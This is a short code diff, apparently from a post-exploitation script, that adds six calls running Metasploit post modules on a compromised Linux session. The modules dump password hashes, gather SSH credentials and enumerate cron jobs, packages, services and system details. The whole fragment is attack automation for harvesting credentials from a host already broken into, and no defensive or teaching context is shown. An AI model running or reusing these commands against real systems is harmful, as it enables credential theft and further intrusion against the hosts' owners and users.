@@ -1,0 +1,7 @@
+				session.run_cmd('run post/linux/gather/hashdump')
+				session.run_cmd('run post/linux/gather/enum_cron')
+				session.run_cmd('run post/linux/gather/enum_packages')
+				session.run_cmd('run post/linux/gather/enum_services')
+				session.run_cmd('run post/linux/gather/enum_linux')
+				session.run_cmd('run post/multi/gather/ssh_creds')
+
